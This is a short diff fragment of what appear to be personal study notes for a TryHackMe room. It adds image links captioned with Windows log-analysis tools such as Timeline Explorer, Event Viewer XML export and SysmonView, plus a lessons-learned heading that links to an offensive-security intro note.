+- ![Desktop Taskbar.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/9ce2b5ef78b7d7cb2161a7e667197eae.png)
+- ![TimelineExplorer.exe execution.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/879dae9fb87b5e387ba5b9fa5d4b5878.png)
+- ![Timeline Explorer usage.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/89abf6b7c405f3b015af211c508d861d.png)
+- ![EventViewer XML export.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c8b35b8ec773178a98abb63b50a7ac60.png)
+- ![SysmonView.exe execution.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d52dcf7d715bec56b7dbc7b9d60d1754.png)
+
+## Notes / Lessons Learned
+[[Intro to Offensive Security]]
+
